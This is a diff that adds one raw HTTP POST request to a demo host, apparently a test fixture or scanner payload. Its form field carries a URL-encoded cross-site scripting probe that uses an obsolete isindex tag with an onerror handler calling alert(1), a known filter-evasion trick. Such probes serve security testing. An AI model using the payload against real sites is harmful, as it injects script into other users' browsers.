@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 62
+Connection: close
+
+data=%3Cisindex+type%3Dimage+src%3D1+onerror%3Dalert%281%29%3E
